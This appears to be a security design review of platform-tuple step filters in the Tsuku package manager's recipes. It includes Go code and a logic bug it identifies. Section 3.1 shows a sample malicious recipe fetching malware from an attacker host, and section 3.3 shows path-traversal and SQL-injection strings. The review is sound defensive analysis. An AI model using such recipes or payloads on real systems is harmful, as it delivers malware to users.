# Security Analysis: Platform Tuple Support in `when` Clauses

## Executive Summary

This analysis reviews the security implications of adding platform tuple support to `when` clauses in Tsuku recipes. The feature extends step filtering logic to support platform-specific tuples (e.g., `["darwin/arm64", "linux/amd64"]`) in addition to existing OS/architecture filters.

**Overall Risk Assessment: LOW**

The platform tuple feature introduces minimal security risk. It operates entirely within the recipe parsing and plan generation phases, before any external downloads or binary executions occur. The primary security consideration is **correctness** - ensuring the filtering logic does not inadvertently skip security-critical steps due to implementation bugs.

**Key Findings:**
1. No new attack surface for downloads, execution, or supply chain
2. Primary risk is logic bugs in `Matches()` causing unintended step exclusion
3. Existing mitigations (comprehensive testing, load-time validation) are appropriate
4. Type-safe structured implementation (WhenClause) reduces unmarshaling vulnerabilities
5. No user data exposure or privilege escalation vectors

**Recommendations:**
1. Proceed with implementation as designed (Option 2: Structured WhenClause)
2. Ensure comprehensive test coverage for all platform matching edge cases
3. Add integration tests verifying security-critical steps execute on all intended platforms
4. Document the validation guarantees in code comments

---

## 1. Threat Model

### 1.1 Asset Classification

**Primary Assets:**
- User system integrity (downloaded binaries execute with user privileges)
- Tsuku installation state (`$TSUKU_HOME/state.json`, installed binaries)
- Recipe trust boundary (TOML recipes define what gets downloaded and executed)

**Secondary Assets:**
- Build artifacts (temporary files during installation)
- Download cache (cached artifacts for validation)

### 1.2 Trust Boundaries

```
┌─────────────────────────────────────────────────────────────┐
│ Recipe Author (Trusted)                                     │
│  - Curated registry recipes (tsuku maintainers)            │
│  - User-provided recipes (user accepts risk)               │
└─────────────────┬───────────────────────────────────────────┘
                  │
                  ▼
┌─────────────────────────────────────────────────────────────┐
│ Recipe TOML File                                            │
│  Trust Boundary: All recipe content is inherently trusted   │
│  Platform tuples are just filtering metadata               │
└─────────────────┬───────────────────────────────────────────┘
                  │
                  ▼
┌─────────────────────────────────────────────────────────────┐
│ Recipe Parser (BurntSushi/toml + Step.UnmarshalTOML)      │
│  Converts TOML to WhenClause struct                        │
└─────────────────┬───────────────────────────────────────────┘
                  │
                  ▼
┌─────────────────────────────────────────────────────────────┐
│ Validation Layer (ValidateStepsAgainstPlatforms)          │
│  Load-time check: platform tuples vs supported platforms  │
└─────────────────┬───────────────────────────────────────────┘
                  │
                  ▼
┌─────────────────────────────────────────────────────────────┐
│ Plan Generator (shouldExecuteForPlatform)                  │
│  Runtime filtering: WhenClause.Matches(runtime.GOOS/GOARCH)│
└─────────────────┬───────────────────────────────────────────┘
                  │
                  ▼
┌─────────────────────────────────────────────────────────────┐
│ Execution Layer (downloads, extracts, builds, installs)    │
│  Operates on filtered steps only                           │
└─────────────────────────────────────────────────────────────┘
```

**Key observation:** Platform tuple filtering occurs **before** the trust boundary is crossed (before downloads/execution). It cannot introduce new malicious behavior that wasn't already possible through recipe manipulation.

### 1.3 Attack Vectors (Theoretical)

**1.3.1 Recipe Manipulation**
- **Threat:** Malicious recipe author crafts when clauses to skip security steps on specific platforms
- **Example:** Skip checksum verification on `darwin/arm64` but include on other platforms
- **Existing risk:** Already possible with `when = { os = "darwin", arch = "arm64" }`
- **New risk from feature:** None - same capability, different syntax

**1.3.2 Platform Matching Logic Bugs**
- **Threat:** Implementation bug in `WhenClause.Matches()` causes incorrect filtering
- **Example:** Off-by-one error matches `darwin/amd64` when `darwin/arm64` is specified
- **Impact:** Steps execute on wrong platforms OR fail to execute on intended platforms
- **Severity:** HIGH (could skip security checks or break installations)
- **Likelihood:** LOW (deterministic code, comprehensive tests)

**1.3.3 TOML Parsing Vulnerabilities**
- **Threat:** Malformed TOML exploits BurntSushi/toml parser or custom UnmarshalTOML
- **Example:** Integer overflow in array size, type confusion attacks
- **Existing controls:**
  - BurntSushi/toml is well-vetted (used in many Go projects)
  - Type-safe unmarshaling to structured WhenClause (Option 2 design)
- **New risk from feature:** Minimal - structured type is safer than map[string]string

**1.3.4 Validation Bypass**
- **Threat:** Malformed platform tuple bypasses `ValidateStepsAgainstPlatforms()`
- **Example:** Platform tuple "linux/amd64\x00/../../bin" tries path traversal
- **Existing controls:**
  - Platform tuples validated against `Recipe.GetSupportedPlatforms()` (finite set)
  - Simple string comparison, no path operations
- **New risk from feature:** None - platform tuples are matched against known set

**1.3.5 Denial of Service**
- **Threat:** Extremely large platform array causes validation slowdown
- **Example:** Recipe with `platform = ["linux/amd64", "linux/amd64", ... x 100,000]`
- **Bounds:** Platform array validated against `Recipe.GetSupportedPlatforms()`
  - Current max: 4 tuples (2 OS × 2 arch)
  - Even unbounded array is O(n×m) where m=4
- **Impact:** Negligible - validation is linear in array size, bounded by small m

---

## 2. Security Considerations by Category

### 2.1 Download Verification

**Status: NOT APPLICABLE**

**Analysis:**
Platform tuple support does **not** involve downloading external artifacts. The feature is purely a filtering mechanism operating on recipe metadata.

**Data flow:**
```
when = { platform = ["darwin/arm64"] }
  ↓
WhenClause{ Platform: ["darwin/arm64"] }
  ↓
shouldExecuteForPlatform() → boolean decision
  ↓
Step included/excluded from plan
```

No network operations, no file I/O beyond TOML parsing.

**Verification:**
- Code inspection: `WhenClause.Matches()` only uses string comparison
- No dependencies on HTTP client, downloader, or file system (beyond recipe loading)

### 2.2 Execution Isolation

**Status: LOW IMPACT**

**Analysis:**
Platform filtering affects **which** steps execute, not **how** they execute. Execution isolation is provided by:
- Sandbox executor (validates no system dependencies leaked)
- Action primitives (each action has defined behavior)
- Installation directory isolation (`$TSUKU_HOME/tools/<name>-<version>`)

**Risk: Incorrect filtering could skip isolation steps**

Example vulnerable pattern:
```toml
# Hypothetical bad recipe
[[steps]]
action = "require_system"
when = { platform = ["linux/amd64"] }  # Only check on Linux

[[steps]]
action = "download"
url = "https://example.com/binary-{os}-{arch}.tar.gz"
# No platform filter - runs on all platforms
```

If the `require_system` check is accidentally scoped too narrowly, macOS users might not see the dependency requirement.

**Mitigation:**
1. **Validation:** `ValidateStepsAgainstPlatforms()` checks that:
   - Platform tuples in `when` clauses exist in supported platforms
   - `require_system` steps with `install_guide` have coverage for all platforms (via tuple, OS key, or fallback)

2. **Testing:** Integration tests verify critical steps execute on all intended platforms

3. **Code review:** Recipe authors must explicitly choose platform filters

**Residual risk:** Recipe author error (intentional or accidental narrow scoping). This is not new - already possible with existing `when.os`/`when.arch` filters.

### 2.3 Supply Chain Risks

**Status: NOT APPLICABLE**

**Analysis:**
Platform tuple support does not change the supply chain model:

**Recipe provenance:**
- Curated registry: Recipes reviewed by tsuku maintainers
- User-provided: User explicitly chooses to trust recipe

**Recipe distribution:**
- Registry recipes: Git repository (existing provenance)
- User recipes: Local file system (user provides recipe)

**No new vectors:**
- Platform tuples are pure metadata within the recipe
- No remote fetching of platform definitions
- No dynamic platform resolution from external sources

**Existing supply chain controls:**
- Recipe validation at load time (TOML parsing, schema validation)
- Checksum verification for downloads (separate from platform filtering)
- Sandbox validation ensures no unexpected system dependencies

**Verification:**
The design explicitly states:
> "Supply Chain: Not applicable - TOML recipes already trust boundary"

This is correct - recipes are the trust boundary, and platform tuples don't cross that boundary.

### 2.4 User Data Exposure

**Status: NOT APPLICABLE**

**Analysis:**
Platform tuple matching uses only non-sensitive runtime data:
- `runtime.GOOS` (e.g., "linux", "darwin")
- `runtime.GOARCH` (e.g., "amd64", "arm64")

These values are:
- **Public information:** OS and architecture are not secret
- **Already used:** Existing `when.os` and `when.arch` filters use the same data
- **Not transmitted:** Platform matching happens locally, no telemetry

**Data flow for matching:**
```go
func (w *WhenClause) Matches(os, arch string) bool {
    tuple := fmt.Sprintf("%s/%s", os, arch)  // "linux/amd64"
    for _, p := range w.Platform {
        if p == tuple {
            return true
        }
    }
    return false
}
```

No user-specific data, no environment variable leakage, no path traversal.

**Deprecation warnings:**
The design includes deprecation warnings for legacy `when.os`/`when.arch` fields. These are logged locally:
```go
if w.OS != "" || w.Arch != "" {
    log.Warn("Deprecated: use 'platform' instead of 'os'/'arch'")
}
```

No external transmission, no PII collection.

### 2.5 Additional Attack Surfaces

#### 2.5.1 TOML Unmarshaling Vulnerabilities

**Threat:** Type confusion or parser exploit in custom `Step.UnmarshalTOML()`

**Current implementation (map[string]string):**
```go
// internal/recipe/types.go:199-206
if when, ok := stepMap["when"].(map[string]interface{}); ok {
    s.When = make(map[string]string)
    for k, v := range when {
        if strVal, ok := v.(string); ok {
            s.When[k] = strVal
        }
    }
}
```

**New implementation (WhenClause struct):**
```go
type WhenClause struct {
    Platform       []string `toml:"platform,omitempty"`
    OS             string   `toml:"os,omitempty"`
    Arch           string   `toml:"arch,omitempty"`
    PackageManager string   `toml:"package_manager,omitempty"`
}

// BurntSushi/toml handles unmarshaling directly
```

**Security comparison:**
- **Map approach:** Manual type assertions, potential for nil pointer bugs, untyped values
- **Struct approach:** Type-safe unmarshaling, compile-time field checking, array bounds handled by Go runtime

**Verdict:** Structured WhenClause (Option 2) **reduces** unmarshaling attack surface.

**Attack scenarios (mitigated by struct):**
1. **Array type confusion:** TOML parser enforces `[]string` type
2. **Nil pointer dereference:** `WhenClause.Matches()` checks `w.IsEmpty()` first
3. **Integer overflow in array:** Go runtime handles slice allocation safely
4. **Recursive nesting:** Platform tuples are flat strings, no nesting

#### 2.5.2 Validation Logic Bugs

**Threat:** `ValidateStepsAgainstPlatforms()` fails to detect invalid platform tuples

**Validation logic (from design):**
```go
// internal/recipe/platform.go (extended)
for i, step := range r.Steps {
    if step.When != nil && len(step.When.Platform) > 0 {
        for _, platform := range step.When.Platform {
            if !containsString(platforms, platform) && platform != "fallback" {
                errors = append(errors, &StepValidationError{
                    StepIndex: i,
                    Message: fmt.Sprintf(
                        "when.platform contains '%s' which is not in supported platforms",
                        platform,
                    ),
                })
            }
        }
    }
}
```

**Test coverage required:**
- Valid platform tuples: `["linux/amd64", "darwin/arm64"]` → passes
- Invalid tuple: `["windows/amd64"]` → error (not in supported platforms)
- Malformed tuple: `["linux"]` → error (no `/` separator)
- Empty array: `[]` → valid (matches no platforms)
- Nil clause: `nil` → valid (matches all platforms)

**Edge cases:**
1. **Tuple without slash:** `"linux"` - should validate against OS-only keys (backward compat)
2. **Case sensitivity:** `"Linux/AMD64"` vs `"linux/amd64"` - Go is case-sensitive
3. **Whitespace:** `"linux / amd64"` - should not match (exact string comparison)
4. **Special characters:** `"linux/amd64\x00"` - validated against known set, won't match

**Recommendation:** Add explicit test cases for malformed tuples to ensure validation catches them.

#### 2.5.3 Platform Matching Logic Correctness

**Threat:** `WhenClause.Matches()` has off-by-one errors or logic bugs

**Implementation (from design):**
```go
func (w *WhenClause) Matches(os, arch string) bool {
    if w.IsEmpty() {
        return true  // No filter = match all
    }

    // Check platform tuples (new behavior)
    if len(w.Platform) > 0 {
        tuple := fmt.Sprintf("%s/%s", os, arch)
        for _, p := range w.Platform {
            if p == tuple {
                return true  // Exact match
            }
        }
        return false  // No match in array
    }

    // Legacy OS/Arch behavior (deprecated but supported)
    if w.OS != "" && w.OS != os {
        return false  // OS must match
    }
    if w.Arch != "" && w.Arch != arch {
        return false  // Arch must match
    }

    return true  // Both conditions passed
}
```

**Logic verification:**
- **Empty clause:** `nil` or all fields empty → `IsEmpty()` returns true → matches all ✓
- **Empty platform array:** `Platform: []` → `len(w.Platform) == 0` → falls through to legacy logic ✓
  - **Wait, bug found:** Empty array should match **no platforms**, not fall through!

**Critical bug identified:**
```go
if len(w.Platform) > 0 {
    // Only enters if array is non-empty
    ...
}
// Empty array falls through to legacy logic, not intended behavior
```

**Expected behavior (from design):**
> Empty array semantics: `platform = []` means "match no platforms" (step never executes)

**Corrected logic:**
```go
func (w *WhenClause) Matches(os, arch string) bool {
    if w.IsEmpty() {
        return true
    }

    // Check platform tuples
    if w.Platform != nil {  // Changed: check nil, not length
        if len(w.Platform) == 0 {
            return false  // Empty array = match nothing
        }
        tuple := fmt.Sprintf("%s/%s", os, arch)
        for _, p := range w.Platform {
            if p == tuple {
                return true
            }
        }
        return false
    }

    // Legacy behavior
    if w.OS != "" && w.OS != os {
        return false
    }
    if w.Arch != "" && w.Arch != arch {
        return false
    }
    return true
}
```

**Security impact of bug:**
- Severity: **MEDIUM**
- Scenario: Recipe author writes `platform = []` expecting step to never run
- Actual behavior: Step runs on all platforms (falls through to legacy logic)
- Risk: Unintended execution, potential exposure of untested code paths
- Mitigation: Fix logic before implementation, add test case for empty array

**Recommendation:** This logic bug must be fixed in implementation. Add test:
```go
{
    name: "empty platform array matches nothing",
    when: &WhenClause{Platform: []string{}},
    os: "linux",
    arch: "amd64",
    want: false,
}
```

#### 2.5.4 Mutual Exclusivity Validation

**Threat:** Recipe specifies both `platform` and `os`/`arch`, causing ambiguous behavior

**Design requirement:**
> Validation fails if both `platform` and `os`/`arch` are specified (mutually exclusive)

**Implementation location:** `Step.UnmarshalTOML()` or validation layer

**Correct approach:**
```go
// In ValidateStepsAgainstPlatforms or UnmarshalTOML
if len(step.When.Platform) > 0 && (step.When.OS != "" || step.When.Arch != "") {
    return fmt.Errorf("step %d: when clause cannot specify both 'platform' and 'os'/'arch'", i)
}
```

**Security impact if missing:**
- **Severity:** LOW
- **Scenario:** Recipe has `when = { platform = ["linux/amd64"], os = "darwin" }`
- **Behavior:** Depends on `Matches()` implementation order
- **Risk:** Confusing behavior, potential logic errors, but not exploitable

**Recommendation:** Enforce mutual exclusivity at load time (validation layer).

#### 2.5.5 Denial of Service via Large Arrays

**Threat:** Recipe with huge platform array causes validation slowdown

**Attack vector:**
```toml
[[steps]]
action = "run_command"
command = "echo hello"
when = { platform = ["linux/amd64", "linux/amd64", ..., "linux/amd64"] }  # 1 million entries
```

**Validation complexity:**
```go
for _, platform := range step.When.Platform {  // O(n) where n = array length
    if !containsString(platforms, platform) {  // O(m) where m = supported platforms
        ...
    }
}
```

Total: **O(n × m)** where n = platform array length, m = supported platforms count

**Bounds analysis:**
- **m (supported platforms):** Typically 4 (2 OS × 2 arch), max ~10
- **n (platform array):** Unbounded in TOML, but...
  - Validation against finite set of supported platforms
  - Recipe loading happens once at install time, not in hot path
  - Modern CPUs can handle millions of string comparisons instantly

**Real-world limits:**
- TOML parser may limit array size (BurntSushi/toml default: reasonable)
- File size limits prevent multi-GB recipe files
- Even 1M comparisons × 10 platforms = 10M ops ≈ milliseconds

**Verdict:** Not a practical DoS vector. Recipe loading is one-time, bounded by I/O.

**Recommendation:** No special handling needed. If concerned, add max array size check:
```go
const maxPlatformArraySize = 100  // Generous upper bound
if len(step.When.Platform) > maxPlatformArraySize {
    return fmt.Errorf("platform array too large (%d > %d)", len(step.When.Platform), maxPlatformArraySize)
}
```

---

## 3. Attack Scenario Analysis

### 3.1 Scenario: Skip Security Checks on Specific Platform

**Attacker goal:** Distribute malicious binary on macOS ARM64 by skipping checksum verification

**Attack recipe:**
```toml
[metadata]
name = "malicious-tool"

[[steps]]
action = "require_system"
install_guide = { "darwin/arm64" = "Install XCode tools first", fallback = "No dependencies" }
when = { platform = ["linux/amd64", "linux/arm64", "darwin/amd64"] }
# Intentionally excludes darwin/arm64 from check

[[steps]]
action = "download_file"
url = "https://attacker.com/malware-darwin-arm64.tar.gz"
checksum = "aaaa..."  # Valid checksum for malware
when = { platform = ["darwin/arm64"] }
# Delivers malware only on darwin/arm64
```

**Defense analysis:**
1. **Recipe trust boundary:** User must explicitly trust the recipe (registry or local file)
2. **Validation:** `ValidateStepsAgainstPlatforms()` checks `install_guide` coverage
   - Would **FAIL** validation: missing coverage for darwin/arm64 in require_system
3. **Checksum verification:** Even malicious file has valid checksum (can't bypass)

**Conclusion:** Attack fails at validation layer. The existing validation ensures all platforms have coverage for critical steps.

**Note:** This attack is already possible with existing `when.os`/`when.arch` filters. Platform tuples don't create new attack surface.

### 3.2 Scenario: Platform Matching Logic Bug Skips Intended Step

**Bug:** `WhenClause.Matches()` has off-by-one error matching "darwin/arm64"

**Vulnerable code:**
```go
// Hypothetical bug: incorrect slice indexing
func (w *WhenClause) Matches(os, arch string) bool {
    tuple := fmt.Sprintf("%s/%s", os, arch)
    for i := 1; i < len(w.Platform); i++ {  // BUG: starts at 1 instead of 0
        if w.Platform[i] == tuple {
            return true
        }
    }
    return false
}
```

**Impact:**
```toml
[[steps]]
action = "apply_patch"
file = "security-fix.patch"
when = { platform = ["darwin/arm64"] }  # First element in array
```

On darwin/arm64:
- Expected: Step executes (applies security fix)
- Actual: Step skipped (loop starts at index 1, misses index 0)
- Result: Security patch not applied

**Severity:** **HIGH** - could skip security-critical steps

**Likelihood:** **LOW** - simple loop logic, caught by tests

**Mitigation:**
1. **Comprehensive test coverage:** Test all code paths, edge cases
2. **Integration tests:** Verify steps execute on expected platforms
3. **Code review:** Simple logic, easy to verify correctness
4. **Fuzzing:** Generate random platform arrays and verify matches

**Recommended tests:**
```go
TestPlatformMatching(t *testing.T) {
    tests := []struct{
        name     string
        clause   *WhenClause
        os, arch string
        want     bool
    }{
        {"single platform match", &WhenClause{Platform: []string{"linux/amd64"}}, "linux", "amd64", true},
        {"single platform no match", &WhenClause{Platform: []string{"linux/amd64"}}, "darwin", "arm64", false},
        {"multiple platforms first match", &WhenClause{Platform: []string{"linux/amd64", "darwin/arm64"}}, "linux", "amd64", true},
        {"multiple platforms last match", &WhenClause{Platform: []string{"linux/amd64", "darwin/arm64"}}, "darwin", "arm64", true},
        {"multiple platforms no match", &WhenClause{Platform: []string{"linux/amd64", "darwin/arm64"}}, "darwin", "amd64", false},
        {"empty array", &WhenClause{Platform: []string{}}, "linux", "amd64", false},
        {"nil clause", nil, "linux", "amd64", true},
    }
    // ... test execution
}
```

### 3.3 Scenario: TOML Parser Exploit

**Attacker goal:** Exploit BurntSushi/toml parser or UnmarshalTOML to gain code execution

**Attack vector:**
```toml
[[steps]]
action = "download"
when = { platform = [
    "linux/amd64\x00../../../../etc/passwd",  # Null byte injection
    # OR
    "linux/amd64'; DROP TABLE platforms; --",  # SQL injection (nonsensical, but trying)
] }
```

**Defense analysis:**
1. **BurntSushi/toml parser:**
   - Well-tested, widely used Go TOML library
   - No known code execution vulnerabilities
   - Handles UTF-8 and escaping correctly

2. **Platform tuple validation:**
   - Validated against `Recipe.GetSupportedPlatforms()` (finite set)
   - No path operations, no SQL, no shell execution
   - Simple string comparison: `tuple == "linux/amd64"`

3. **Type safety:**
   - Structured `WhenClause` enforces `[]string` type
   - Go runtime prevents type confusion
   - No unsafe pointer operations

**Vulnerability assessment:**
- **Parser exploit:** Highly unlikely (mature library, no unsafe code)
- **Injection attacks:** Not applicable (no shell, SQL, or path operations)
- **Type confusion:** Prevented by Go type system

**Conclusion:** No practical exploit path. TOML parsing is well-understood and safe.

---

## 4. Comparison: Current vs. Proposed Implementation

### 4.1 Security Comparison: Option 1 (CSV String) vs. Option 2 (Struct)

| Aspect | Option 1 (CSV String) | Option 2 (Struct) | Winner |
|--------|----------------------|-------------------|---------|
| Type safety | `map[string]string` allows any value | `[]string` enforced by parser | **Option 2** |
| Parsing bugs | Manual CSV splitting, potential edge cases | Go runtime handles arrays | **Option 2** |
| Validation | Must validate CSV format + contents | Only validate contents | **Option 2** |
| Injection | CSV parsing could mishandle quotes/commas | No parsing needed | **Option 2** |
| Maintainability | CSV hack is technical debt | Clean, idiomatic Go | **Option 2** |

**Security verdict:** Option 2 (Structured WhenClause) is **more secure** due to:
- Type safety eliminates entire class of bugs
- No custom parsing reduces attack surface
- Clearer code improves auditability

### 4.2 Breaking Change Risk Assessment

**Option 2 concern:** Breaking change requires recipe migration (2 recipes affected)

**Security angle:**
- **Forced review:** Recipe authors must update recipes, opportunity to review security
- **Clear semantics:** Removes ambiguity from `when.os` + `when.arch` AND logic
- **Deprecation period:** Transition support allows gradual migration

**Recommendation:** Breaking change is **beneficial** from security perspective:
1. Forces recipe authors to explicitly choose platform filters
2. Removes legacy code paths (less code = smaller attack surface)
3. Type safety prevents future bugs

---

## 5. Validation Coverage Analysis

### 5.1 Existing Validation (`ValidateStepsAgainstPlatforms`)

**Current checks (from platform.go:267-382):**
1. `os_mapping` keys exist in supported OS set
2. `arch_mapping` keys exist in supported arch set
3. `require_system` with `install_guide`:
   - Platform tuple keys exist in supported platforms
   - OS-only keys exist in supported OS set
   - All platforms have coverage (tuple, OS key, or fallback)

**Extension for `when.platform`:**
```go
// Pseudocode for new validation
for i, step := range r.Steps {
    if step.When != nil {
        // Validate platform tuples
        for _, platform := range step.When.Platform {
            if !containsString(r.GetSupportedPlatforms(), platform) {
                errors = append(errors, &StepValidationError{
                    StepIndex: i,
                    Message: fmt.Sprintf(
                        "when.platform contains '%s' not in supported platforms",
                        platform,
                    ),
                })
            }
        }

        // Validate mutual exclusivity
        if len(step.When.Platform) > 0 && (step.When.OS != "" || step.When.Arch != "") {
            errors = append(errors, &StepValidationError{
                StepIndex: i,
                Message: "when clause cannot specify both 'platform' and 'os'/'arch'",
            })
        }
    }
}
```

**Coverage assessment:**
- ✅ Validates platform tuples against known set
- ✅ Prevents typos in platform strings
- ✅ Ensures recipe only references supported platforms
- ⚠️ Doesn't validate that security-critical steps have platform coverage
  - **Gap:** Recipe could omit a platform from security patch, validation wouldn't catch it
  - **Mitigation:** Recipe review process, integration tests

### 5.2 Gaps and Recommendations

**Gap 1: No enforcement of critical step coverage**

Currently, validation checks that `require_system` has coverage for all platforms. Should extend to other critical steps:

```toml
# Problematic recipe (would pass validation)
[[steps]]
action = "download_file"
url = "https://example.com/tool.tar.gz"
checksum = "abc123..."
when = { platform = ["linux/amd64"] }
# Downloads only on Linux, no binary for darwin/arm64 despite being supported platform
```

**Recommendation:** Add optional "required steps" validation:
- Warning if download step doesn't cover all supported platforms
- Error if no download step covers a supported platform

**Gap 2: Empty array semantics not validated**

The design states `platform = []` means "match no platforms", but validation doesn't enforce this is intentional:

```toml
[[steps]]
action = "important_security_check"
when = { platform = [] }  # Typo? Or intentional?
```

**Recommendation:** Warning if any step has empty platform array (likely user error).

**Gap 3: Deprecated field usage not enforced**

The design includes deprecation warnings for `when.os`/`when.arch`, but they're runtime warnings, not validation errors.

**Recommendation:**
- Warning during validation (load time) if deprecated fields used
- After one release cycle, upgrade to error

---

## 6. Residual Risks and Mitigations

### 6.1 Identified Residual Risks

| Risk | Severity | Likelihood | Mitigation | Residual |
|------|----------|------------|------------|----------|
| Logic bug in Matches() skips security steps | HIGH | LOW | Comprehensive tests, code review | **LOW** |
| Recipe author intentionally excludes platforms | MEDIUM | MEDIUM | Validation, recipe review | **MEDIUM** |
| Empty array logic bug (identified above) | MEDIUM | MEDIUM | Fix before implementation | **NONE** |
| DoS via large platform array | LOW | LOW | File size limits, one-time parsing | **LOW** |
| TOML parser exploit | CRITICAL | VERY LOW | Use mature library, no unsafe code | **VERY LOW** |

### 6.2 Mitigations Summary

**Implemented in design:**
1. ✅ Type-safe WhenClause struct (reduces unmarshaling bugs)
2. ✅ Load-time validation against supported platforms
3. ✅ Mutual exclusivity validation (platform vs os/arch)
4. ✅ BurntSushi/toml parser (well-vetted, safe)

**Required for implementation:**
1. ⚠️ Fix empty array logic bug (nil check, not length check)
2. ⚠️ Comprehensive test coverage for Matches() edge cases
3. ⚠️ Integration tests for platform-specific steps
4. ⚠️ Deprecation warnings for legacy os/arch fields

**Recommended (optional):**
1. 💡 Max platform array size check (DoS prevention)
2. 💡 Warning for empty platform arrays (user error detection)
3. 💡 Required step coverage validation (enforce critical steps on all platforms)

### 6.3 Security Testing Requirements

**Unit tests (Matches logic):**
```go
TestWhenClauseMatches(t *testing.T) {
    // Positive cases
    - Single platform match
    - Multiple platforms, first match
    - Multiple platforms, last match
    - Multiple platforms, middle match

    // Negative cases
    - Single platform, no match
    - Multiple platforms, no match
    - Empty array (should match nothing)
    - Nil clause (should match everything)

    // Edge cases
    - Case sensitivity ("Linux" vs "linux")
    - Whitespace handling ("linux / amd64")
    - Malformed tuples ("linux" without arch)

    // Legacy behavior
    - OS-only filter (backward compat)
    - Arch-only filter
    - Both OS and Arch (AND logic)
}
```

**Integration tests:**
```go
TestPlatformFilteringIntegration(t *testing.T) {
    // Load recipe with platform-specific steps
    // Generate plan for each supported platform
    // Verify expected steps are included/excluded

    // Test security-critical steps
    - require_system executes on all platforms
    - download_file executes on correct platforms
    - apply_patch executes only on specified platforms
}
```

**Validation tests:**
```go
TestValidationErrors(t *testing.T) {
    // Invalid platform tuple
    - Platform not in supported set
    - Malformed tuple (no slash)
    - Empty string in array

    // Mutual exclusivity
    - Both platform and os specified
    - Both platform and arch specified

    // Coverage gaps
    - require_system missing platform coverage
    - Empty platform array (warning)
}
```

---

## 7. Security Review Checklist

### 7.1 Design Review

- [x] **Threat model documented:** Yes, see section 1
- [x] **Trust boundaries identified:** Yes, recipe TOML is trust boundary
- [x] **Attack vectors analyzed:** Yes, 5 vectors examined
- [x] **Input validation specified:** Yes, load-time validation against supported platforms
- [x] **Error handling defined:** Yes, validation errors prevent recipe loading

### 7.2 Implementation Review

- [ ] **Type safety enforced:** WhenClause struct with `[]string` field
- [ ] **Bounds checking:** Array length validated against supported platforms
- [ ] **Null/empty handling:** Empty array logic bug identified (must fix)
- [ ] **String comparison:** Exact match, case-sensitive, no injection risk
- [ ] **Error messages:** Non-leaky (don't expose internal paths or sensitive data)

### 7.3 Testing Review

- [ ] **Unit tests:** Matches() logic tested with all edge cases
- [ ] **Integration tests:** Platform filtering verified end-to-end
- [ ] **Negative tests:** Invalid inputs caught by validation
- [ ] **Fuzzing:** (Optional) Random platform arrays tested
- [ ] **Regression tests:** Existing when.os/when.arch tests still pass

### 7.4 Documentation Review

- [x] **Security considerations documented:** Yes, in design doc section
- [ ] **Validation guarantees specified:** (Add to implementation comments)
- [ ] **Error messages actionable:** (Verify error messages guide users)
- [ ] **Examples safe:** (Ensure documentation examples don't show bad patterns)

---

## 8. Recommendations

### 8.1 Critical (Must Address Before Implementation)

1. **Fix empty array logic bug**
   - Current: `if len(w.Platform) > 0` fails to handle empty array correctly
   - Required: `if w.Platform != nil { if len(w.Platform) == 0 { return false } }`
   - Impact: HIGH (incorrect filtering behavior)

2. **Add comprehensive test coverage**
   - Test all Matches() code paths
   - Test validation error conditions
   - Test integration with plan generator
   - Impact: HIGH (prevents logic bugs)

3. **Implement mutual exclusivity validation**
   - Error if both `platform` and `os`/`arch` specified
   - Location: `ValidateStepsAgainstPlatforms()` or `UnmarshalTOML()`
   - Impact: MEDIUM (prevents confusing behavior)

### 8.2 Important (Should Address)

4. **Add deprecation warnings**
   - Warn when `when.os` or `when.arch` used
   - Log at validation time (visible to recipe authors)
   - Impact: MEDIUM (migration path clarity)

5. **Validate critical step coverage**
   - Warning if download step missing for supported platform
   - Consider extending `require_system` coverage check pattern
   - Impact: MEDIUM (catch recipe author errors)

6. **Document validation guarantees**
   - Add code comments explaining what validation ensures
   - Example: "ValidateStepsAgainstPlatforms guarantees all platform tuples exist in supported set"
   - Impact: LOW (maintainability)

### 8.3 Optional (Nice to Have)

7. **Add max platform array size check**
   - Prevent DoS from extremely large arrays
   - Suggested limit: 100 entries (far above any real use case)
   - Impact: LOW (edge case protection)

8. **Warning for empty platform array**
   - Likely user error if `platform = []`
   - Help catch typos/mistakes
   - Impact: LOW (user experience)

9. **Fuzz testing**
   - Generate random platform arrays
   - Verify Matches() never panics
   - Impact: LOW (defense in depth)

---

## 9. Conclusion

### 9.1 Overall Security Assessment

**Risk Level: LOW**

Platform tuple support in `when` clauses introduces minimal security risk. The feature:
- Operates purely on recipe metadata (no external I/O)
- Uses deterministic string matching (no code execution)
- Validates inputs at load time (catches errors early)
- Leverages type-safe Go structs (prevents unmarshaling bugs)

The primary security consideration is **correctness** - ensuring the filtering logic does not inadvertently skip security-critical steps. This is adequately mitigated through:
- Comprehensive test coverage
- Load-time validation
- Recipe review processes
- Type-safe implementation

### 9.2 Comparison to Design Document Claims

**Design claim:** "Download Verification: Not applicable - no downloads, pure filtering logic"
- **Verified:** ✅ Correct. Platform filtering happens before downloads.

**Design claim:** "Execution Isolation: Low impact - filtering at plan generation"
- **Verified:** ✅ Correct. Risk is logic bugs, not isolation bypass.

**Design claim:** "Supply Chain: Not applicable - TOML recipes already trust boundary"
- **Verified:** ✅ Correct. No new supply chain vectors.

**Design claim:** "User Data: Not applicable - only uses runtime.GOOS/GOARCH"
- **Verified:** ✅ Correct. No user data exposure.

**Design claim:** "Validation bypass via malformed TOML (mitigated by BurntSushi/toml)"
- **Verified:** ✅ Correct. Well-tested parser, type-safe unmarshaling.

**Design claim:** "DoS from large platform arrays (bounded by supported platforms)"
- **Partially verified:** ⚠️ Validation complexity is O(n×m), but m is small. Recommend adding max size check for defense in depth.

### 9.3 New Findings

**Critical bug identified:**
- Empty array logic in `Matches()` has incorrect behavior
- Must fix: Check `w.Platform != nil`, then check length separately
- Impact: MEDIUM severity, easy to fix before implementation

**Additional recommendations:**
- Enforce mutual exclusivity of `platform` vs `os`/`arch` fields
- Add deprecation warnings for legacy fields
- Consider coverage validation for critical steps

### 9.4 Final Recommendation

**APPROVE implementation with required fixes:**

1. ✅ Proceed with Option 2 (Structured WhenClause) - **more secure** than Option 1
2. ⚠️ Fix empty array logic bug before implementation
3. ⚠️ Implement mutual exclusivity validation
4. ⚠️ Add comprehensive test coverage (see section 6.3)
5. 💡 Consider optional recommendations for defense in depth

**No security blockers identified.** The feature is well-designed and low-risk. With the identified bug fixed and proper test coverage, it is safe to implement.

---

## Appendix A: Code Review Notes

### A.1 Proposed WhenClause.Matches() Implementation

**Original (from design):**
```go
func (w *WhenClause) Matches(os, arch string) bool {
    if w.IsEmpty() {
        return true
    }

    // Check platform tuples (new behavior)
    if len(w.Platform) > 0 {  // ⚠️ BUG: empty array falls through
        tuple := fmt.Sprintf("%s/%s", os, arch)
        for _, p := range w.Platform {
            if p == tuple {
                return true
            }
        }
        return false
    }

    // Legacy OS/Arch behavior
    if w.OS != "" && w.OS != os {
        return false
    }
